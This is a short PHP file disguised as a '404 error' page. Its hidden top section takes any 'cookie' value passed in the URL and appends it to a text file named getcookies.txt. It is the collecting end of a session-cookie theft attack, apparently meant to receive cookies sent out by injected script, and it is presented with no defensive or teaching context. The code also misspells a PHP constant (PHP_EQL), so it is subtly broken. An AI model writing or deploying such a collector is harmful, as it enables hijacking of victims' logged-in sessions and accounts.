<?php
if (isset($_GET['cookie']))
{
	$file = 'getcookies.txt';
	file_put_contents($file,$_GET['cookie'].PHP_EQL, FILE_APPEND);
	
}
?>
<!DOCTYPE.html>
<html>
<title>ERROE 404-Problem found</title>
<body>
<h1 align="center"> oh No! Something went Wrong</h1>
</body>
</html>